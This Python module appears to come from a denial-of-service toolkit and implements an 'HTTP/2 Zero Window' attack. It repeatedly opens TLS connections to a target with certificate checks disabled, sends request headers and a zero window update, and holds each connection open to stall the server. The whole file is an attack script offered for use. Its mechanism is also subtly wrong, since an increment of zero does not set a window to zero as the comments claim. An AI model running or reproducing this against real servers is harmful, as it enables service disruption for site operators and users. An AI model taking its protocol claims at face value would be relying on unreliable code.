#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the CBT (Core Brim Tech) project, https://www.corebrimtech.com

Copyright (c) 2024 | MOMODU KAMARA-KOLLEH

You should have received a copy of the GNU General Public License along
with CBT; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""
import sys, random, socket, ssl, time, threading
try:
    from urlparse import urlparse
except:
    from urllib.parse import urlparse
try:
    import h2.connection
    import h2.events
    import h2.config
    H2_AVAILABLE = True
except:
    H2_AVAILABLE = False

# CBT HTTP/2 Zero Window (HTTP2ZEROWIN)
def http2zerowinize(target, rounds):
    if not H2_AVAILABLE:
        print("[Error] [AI] [HTTP2ZEROWIN] h2 library not available. Install with: pip3 install h2")
        return
    n=0
    try:
        for x in range (0,int(rounds)):
            n=n+1
            try:
                if target.startswith('http://'):
                    target = target.replace('http://','')
                    port = 80
                elif target.startswith('https://'):
                    target = target.replace('https://','')
                    port = 443
                else:
                    port = 443
                
                # Create SSL context
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                
                # Connect
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock = ctx.wrap_socket(sock, server_hostname=target)
                sock.connect((target, port))
                
                # Configure H2 connection
                config = h2.config.H2Configuration(client_side=True)
                conn = h2.connection.H2Connection(config=config)
                conn.initiate_connection()
                sock.sendall(conn.data_to_send())
                
                # Zero Window: Open stream, set window size to 0
                stream_id = conn.get_next_available_stream_id()
                headers = [
                    (':method', 'GET'),
                    (':path', '/'),
                    (':scheme', 'https'),
                    (':authority', target),
                ]
                conn.send_headers(stream_id, headers)
                sock.sendall(conn.data_to_send())
                
                # Set window update to 0 (Zero Window attack)
                conn.window_increment(stream_id, 0)
                sock.sendall(conn.data_to_send())
                
                print("[Info] [AI] [HTTP2ZEROWIN] Firing 'zero window' ["+str(n)+"] -> [STALLING!]")
                time.sleep(1)  # Keep connection open
                sock.close()
            except:
                print("[Error] [AI] [HTTP2ZEROWIN] Failed to engage with 'zero window' ["+str(n)+"]")
    except:
        print("[Error] [AI] [HTTP2ZEROWIN] Failing to engage... -> Is still target online? -> [Checking!]")

class HTTP2ZEROWIN(object):
    def attacking(self, target, rounds):
        print("[Info] [AI] HTTP/2 Zero Window (HTTP2ZEROWIN) is ready to fire: [" , rounds, "zero windows ]")
        http2zerowinize(target, rounds)
